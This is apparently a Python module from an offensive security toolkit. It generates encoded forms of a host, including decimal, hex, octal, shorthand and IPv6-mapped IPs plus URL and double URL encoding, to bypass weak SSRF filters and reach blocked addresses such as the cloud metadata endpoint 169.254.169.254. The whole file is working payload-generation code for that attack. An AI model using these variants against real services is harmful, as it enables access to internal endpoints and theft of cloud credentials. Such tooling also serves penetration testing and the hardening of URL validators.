"""URL/host encoding variants used to bypass naive SSRF filters.

Only HTTP(S) URLs are produced here; the goal is to make a blocked host
(e.g. 169.254.169.254) resolve to the same address through representations a
weak validator fails to normalize.
"""

from __future__ import annotations

import ipaddress
from urllib.parse import quote


def _as_ipv4(host: str) -> str | None:
    try:
        addr = ipaddress.ip_address(host.strip("[]"))
    except ValueError:
        return None
    if addr.version != 4:
        return None
    return str(addr)


def to_decimal(host: str) -> str | None:
    """169.254.169.254 -> 2852039166"""
    ip = _as_ipv4(host)
    if ip is None:
        return None
    packed = ipaddress.IPv4Address(ip).packed
    return str(int.from_bytes(packed, "big"))


def to_hex_variants(host: str) -> list[str]:
    """0xA9FEA9FE, 0xA9.0xFE.0xA9.0xFE, 0xA9FE.A9FE"""
    ip = _as_ipv4(host)
    if ip is None:
        return []
    octets = [int(octet) for octet in ip.split(".")]
    variants = [
        "0x" + "".join(f"{o:02X}" for o in octets),
        ".".join(f"0x{o:02X}" for o in octets),
        "0x" + f"{octets[0]:02X}{octets[1]:02X}." + f"{octets[2]:02X}{octets[3]:02X}",
    ]
    # de-duplicate while keeping order
    return list(dict.fromkeys(variants))


def to_octal_variants(host: str) -> list[str]:
    """0251.0376.0251.0376 (and mixed decimal/octal forms)"""
    ip = _as_ipv4(host)
    if ip is None:
        return []
    octets = [int(octet) for octet in ip.split(".")]
    return [".".join(f"0{o:o}" if o else "0" for o in octets)]


def to_shorthand(host: str) -> str | None:
    """169.254.169.254 -> 169.254.42302 (last two octets packed into one)"""
    ip = _as_ipv4(host)
    if ip is None:
        return None
    a, b, c, d = (int(octet) for octet in ip.split("."))
    return f"{a}.{b}.{c * 256 + d}"


def to_ipv6_mapped(host: str) -> list[str]:
    """[::ffff:169.254.169.254] and ::ffff:a9fe:a9fe"""
    ip = _as_ipv4(host)
    if ip is None:
        return []
    a, b, c, d = (int(octet) for octet in ip.split("."))
    return [
        f"[::ffff:{a}.{b}.{c}.{d}]",
        f"[::ffff:{a:02x}{b:02x}:{c:02x}{d:02x}]",
    ]


def url_encode(value: str) -> str:
    return quote(value, safe="")


def double_url_encode(value: str) -> str:
    return quote(quote(value, safe=""), safe="")


def host_variants(host: str) -> list[str]:
    """Every textual representation of ``host`` that should hit the same IP.

    Non-IP hosts (DNS names) only get encoding/trailing-dot variants.
    """
    variants: list[str] = [host, f"{host}."]
    if _as_ipv4(host):
        decimal = to_decimal(host)
        if decimal:
            variants.append(decimal)
        variants.extend(to_hex_variants(host))
        variants.extend(to_octal_variants(host))
        shorthand = to_shorthand(host)
        if shorthand:
            variants.append(shorthand)
        variants.extend(to_ipv6_mapped(host))
    # de-duplicate while keeping order
    return list(dict.fromkeys(variants))
